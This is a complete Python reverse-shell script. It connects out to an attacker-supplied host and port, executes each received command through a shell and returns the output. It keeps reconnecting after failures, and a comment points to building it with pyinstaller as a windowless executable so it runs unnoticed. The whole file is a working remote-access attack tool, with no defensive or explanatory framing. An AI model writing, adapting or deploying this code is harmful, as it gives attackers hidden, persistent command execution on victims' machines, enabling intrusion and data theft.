#!/usr/bin/env python
import os
from time import sleep
from subprocess import Popen, PIPE
from socket import socket, AF_INET, SOCK_STREAM

def reverse_console(h, p, w=60):
    while 6:
        try:
            C = socket(AF_INET, SOCK_STREAM)
            C.connect((h, int(p)))
            S, R = C.send, C.recv
            STREAM_END_SIG = b"\x00\x00"
            D = lambda I: I.decode("utf-8")
            A = lambda I: (I.stdout.read() or I.stderr.read() or b"") + STREAM_END_SIG
            # pyinstaller --noconsole, Popen [Error 6]
            # https://bugs.python.org/issue3905#msg73408
            E = lambda I: Popen(I, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
            while 6: S(A(E(D(R(1024)))))
        except Exception:
            sleep(int(w))

if __name__ == "__main__":
    import sys
    reverse_console(*sys.argv[1].split(":"))
